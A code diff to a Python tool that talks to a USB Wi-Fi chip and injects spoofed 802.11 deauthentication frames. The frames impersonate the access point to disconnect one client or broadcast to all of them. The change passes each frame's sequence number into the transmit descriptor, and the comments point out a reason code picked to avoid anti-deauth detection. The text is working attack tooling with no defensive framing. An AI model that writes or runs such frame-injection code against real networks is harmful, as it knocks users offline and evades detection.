@@ -32,6 +32,7 @@ from .constants import (
     TXDESC32_RETRY_LIMIT_ENABLE,
     TXDESC32_RETRY_LIMIT_MGNT,
     TXDESC32_RETRY_LIMIT_SHIFT,
+    TXDESC32_SEQ_SHIFT,
     TXDESC32_USE_DRIVER_RATE,
     TXDESC40_AGG_BREAK,
     TXDESC_ANTENNA_SELECT_A,
@@ -81,7 +82,7 @@ def build_deauth(bssid: bytes, client: bytes, reason: int = REASON_CODE_CLASS3_F
     - `addr1` is the destination (client being kicked, or `ff:..:ff` for bcast).
     - `addr2` is the source — we pretend to be the AP, so this is BSSID.
     - `addr3` is BSSID (mandatory in MGMT frames).
-    - Sequence number is left at 0; the chip's seq counter takes over in fill_txdesc_v3.
+    - Sequence number is left at 0; the driver's inject path stamps it.
 
     Reason codes: 0x07 (class-3 frame from non-associated STA) is a common
     "polite" disassociate that won't trigger anti-deauth heuristics on
@@ -100,7 +101,7 @@ def build_deauth(bssid: bytes, client: bytes, reason: int = REASON_CODE_CLASS3_F
         client,        # addr1: destination
         bssid,         # addr2: source (we spoof the AP)
         bssid,         # addr3: BSSID
-        0,             # seq_ctrl (chip will overwrite)
+        0,             # seq_ctrl (stamped on inject)
         reason,        # body: reason code
     )
 
@@ -108,7 +109,7 @@ def build_deauth(bssid: bytes, client: bytes, reason: int = REASON_CODE_CLASS3_F
 # ---- descriptor builder ---------------------------------------------
 
 
-def build_tx_desc_mgmt(pkt_len: int, is_broadcast: bool,
+def build_tx_desc_mgmt(pkt_len: int, is_broadcast: bool, seq_number: int,
                        retry_limit: int = TXDESC32_RETRY_LIMIT_MGNT) -> bytearray:
     """Construct a 32-byte tx descriptor for a MGMT frame.
 
@@ -140,8 +141,8 @@ def build_tx_desc_mgmt(pkt_len: int, is_broadcast: bool,
     txdw2 = TXDESC40_AGG_BREAK | TXDESC_ANTENNA_SELECT_A | TXDESC_ANTENNA_SELECT_B
     struct.pack_into("<I", desc, 8, txdw2)
 
-    # txdw3: sequence number left at 0; chip's seq counter takes over.
-    # (fill_txdesc_v3 line 5350 sets it from skb seq_ctrl; we use 0.)
+    # txdw3: the frame's own sequence number (fill_txdesc_v3, core.c:5350).
+    struct.pack_into("<I", desc, 12, seq_number << TXDESC32_SEQ_SHIFT)
 
     # txdw4: USE_DRIVER_RATE (for MGMT — line 5359)
     txdw4 = TXDESC32_USE_DRIVER_RATE
@@ -200,7 +201,8 @@ def send_mgmt_frame(
     the number of bytes actually written (descriptor + MPDU). Raises `usb.core.USBError` on
     USB-level failure (e.g. timeout, pipe stall, no device).
     """
-    desc = build_tx_desc_mgmt(len(mpdu), is_broadcast, retry_limit=retry_limit)
+    seq_number = int.from_bytes(mpdu[22:24], "little") >> 4
+    desc = build_tx_desc_mgmt(len(mpdu), is_broadcast, seq_number, retry_limit=retry_limit)
     calc_tx_desc_csum(desc)
     urb = bytes(desc) + mpdu
     written = dev.write(ep_out, urb, timeout_ms)
